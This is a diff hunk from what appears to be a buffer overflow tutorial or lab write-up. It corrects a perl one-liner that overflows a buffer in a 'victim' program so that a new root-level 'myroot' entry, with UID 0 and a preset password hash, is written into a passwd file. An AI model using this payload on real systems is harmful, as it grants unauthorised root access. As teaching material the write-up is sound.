@@ -64,7 +64,7 @@ So I'll create a root user by writing user_info in '/etc/passwd'.
   the length of string from 'myroot' to '/tmp' should be same with the distance between 'buffer' and 'datafile'.   
   Let's assume the number of 'A' is k which satisfing this condition. Then we can add root user by 
   
-  >./victim $(perl -e 'print "myroot:XXVgr9a1cu6os:0:0:" . "A: x k . ":/root:/tmp/etc/passwd"')  
+  >./victim $(perl -e 'print "myroot:XXVgr9a1cu6os:0:0:" . "A" x k . ":/root:/tmp/etc/passwd"')  
   
   ```
   :~$ cat etc/passwd
